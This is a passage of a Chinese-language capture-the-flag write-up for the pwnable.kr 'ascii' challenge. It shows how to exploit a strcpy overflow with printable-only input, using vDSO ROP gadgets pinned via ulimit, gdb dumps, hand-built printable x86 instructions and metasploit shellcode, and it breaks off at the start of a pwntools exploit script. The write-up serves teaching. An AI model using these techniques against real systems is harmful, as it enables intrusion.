          break;
        ptr = (_BYTE *)(base + offset);
        *ptr = getchar();
        ++offset;
      }
      while ( is_ascii(*ptr) );
      puts("triggering bug...");
      return (int)vuln();
    }
    char *vuln()
    {
      char dest; // [sp+10h] [bp-A8h]@1
      return strcpy(&dest, (const char *)0x80000000);
    }
思路：
1.生成BufferRegister为EAX的shellcode
2.构造Alphanumeric Instructions设置寄存器EAX为shellcode的地址
3.将Printable shellcode写入mmap的内存中
4.构造ROP Chain跳入0x80000000
5.执行shellcode
**STEP1**
使用ldd查看程序并未加载动态库可以确定本程序是静态编译的。静态编译的程序通常有大量的ROP
Gadgets供我们使用，不过题目要求输入的字符为可打印字符，这就需要Gadgets的地址是Printable的。
    gdb-peda$ info proc map
    process 15655
    Mapped address spaces:
    Start Addr   End Addr       Size     Offset objfile
     0x8048000  0x80ed000    0xa5000        0x0 /home/user/pwn/pwnkr/ascii/ascii
     0x80ed000  0x80ef000     0x2000    0xa5000 /home/user/pwn/pwnkr/ascii/ascii
     0x80ef000  0x8113000    0x24000        0x0 [heap]
    0x55555000 0x55557000     0x2000        0x0 [vvar]
    0x55557000 0x55559000     0x2000        0x0 [vdso]
    0xfffdd000 0xffffe000    0x21000        0x0 [stack]
可以看出代码段中的地址0x080e均是不可打印字符，所以不能在代码段中搜索Gadgets。不过可以使用ulimit -s
unlimited将vDSO的基址固定来找vDSO中的Gadgets([mmap及linux地址空间随机化失效漏洞](http://weaponx.site/2017/03/13/mmap%E5%8F%8Alinux%E5%9C%B0%E5%9D%80%E7%A9%BA%E9%97%B4%E9%9A%8F%E6%9C%BA%E5%8C%96%E5%A4%B1%E6%95%88%E6%BC%8F%E6%B4%9E/))。
使用命令dump binary memory ./vDsodump 0x55557000
0x55559000将vDSO所在的内存空间dump出来，当程序执行到ret观察栈中的数据并寻找可用的数据。
    gdb-peda$ stack 15
    0000| 0xffffd63c --> 0x8048fcb (:mov    ebx,DWORD PTR [ebp-0x4])
    0004| 0xffffd640 --> 0x80c562e ("triggering bug...")
    0008| 0xffffd644 --> 0x1000
    0012| 0xffffd648 --> 0x7
    0016| 0xffffd64c --> 0x32 ('2')
    0020| 0xffffd650 --> 0xffffffff
    0024| 0xffffd654 --> 0x0
    0028| 0xffffd658 --> 0xffffd704 --> 0xffffd839 ("/home/user/pwn/pwnkr/ascii/ascii")
    0032| 0xffffd65c --> 0x1
    0036| 0xffffd660 --> 0x80496e0 (:push   ebx)
    0040| 0xffffd664 --> 0x0
    0044| 0xffffd668 --> 0x80000000 --> 0xa31 ('1n')
    0048| 0xffffd66c --> 0x2
    0052| 0xffffd670 --> 0x0
    0056| 0xffffd674 --> 0x0
明显看出pop3_ret + pop3_ret +
pop2_ret可以让程序跳入0x80000000执行shellcode。然后使用rp++在dump出的vDSO内存空间中搜索ROP
Gadgets。在offset中寻找Printable的Gadgets发现有pop3_ret(0x00000751)和pop2_ret(0x00000752)，这样就可以构造出跳入0x80000000的ROP
Chain。
**STEP2**
使用metasploit生成BufferRegister为EAX的shellcode，现在需要编写Printable
Instructions将EAX设置为shellcode起始的地址。opcode为Alphanumeric的指令如下表所示
r(register)代表寄存器，r8代表8位寄存器例如alah等
m(memory)代表内存
imm(immediate value)代表立即数
rel(relative address)代表相对地址
r/m(register or
memory)代表内存或寄存器，可参考[ModR/M与SIB编码](http://blog.sina.com.cn/s/blog_67b113a101011fl9.html)
在程序跳入shellcode中(0x80000000)时，各个寄存器的值如下。
    gdb-peda$ info r
    eax            0xffffd5900xffffd590
    ecx            0x800000d00x800000d0
    edx            0xffffd6600xffffd660
    ebx            0x800000d70x800000d7
    esp            0xffffd66c0xffffd66c
    ebp            0xa6161610xa616161
    esi            0x414141410x41414141
    edi            0x414141410x41414141
    eip            0x800000000x80000000
可以使用XOR AL, imm8清除EAX的低7bit，再用过DEC EAX/AX完成EAX的高位退位，多次重复后可以得到需要的地址（本实例仅需重复一次）。
    # Alphanumeric
    push ecx       //Q
    pop eax        //X    => eax = 0x800000d0
    xor al,0x50    //4P   => eax = 0x80000080
    push eax       //P
    pop ecx        //Y
    dec ecx        //I    => ecx = 0x8000007f
    push ecx       //Q
    pop eax        //X
    xor al,0x74    //4t   => eax = 0x8000000b => shellcode begin = 0x80000000 + len(QX4PPYIQX4t)
得到的指令序列为QX4PPYIQX4t。但题目中并不要求Alphanumeric而是要求Printable，所以可以使用sub完成寄存器数据的修改。
    >>> asm("sub eax,0x41")
    'x83xe8A'
    >>> asm("sub ebx,0x41")
    'x83xebA'
    >>> asm("sub ecx,0x41")
    'x83xe9A'
    >>> asm("sub edx,0x41")
    'x83xeaA'
    >>> asm("sub al,0x41")
    ',A'
    >>> asm("sub bl,0x41")
    'x80xebA'
    >>> asm("sub cl,0x41")
    'x80xe9A'
    >>> asm("sub dl,0x41")
    'x80xeaA'
能大段修改的寄存器只有EAX且范围为0x20-0x7e，可以分两步修改。最终使用的Shellcode头部为
    # Printable
    push ebx       //S
    pop  eax       //X    => 0x800000d7
    sub  al, 0x7e  //,~   => 0x80000059
    sub  al, 0x53  //,S   => 0x80000006 => shellcode begin = 0x80000000 + len(SX,~,S)
和shellcode拼接起来就获得了最终的exploit
    from pwn import *
    pop3_ret = 0x00000751 # : pop ebx ; pop esi ; pop ebp ; ret  ;  (1 found)
    pop2_ret = 0x00000752 # : pop esi ; pop ebp ; ret  ;  (1 found)
    # 0x1f 
[http://www.c-jump.com/CIS77/CPU/x86/X77_0080_mod_reg_r_m_byte_reg.htm](http://www.c-jump.com/CIS77/CPU/x86/X77_0080_mod_reg_r_m_byte_reg.htm)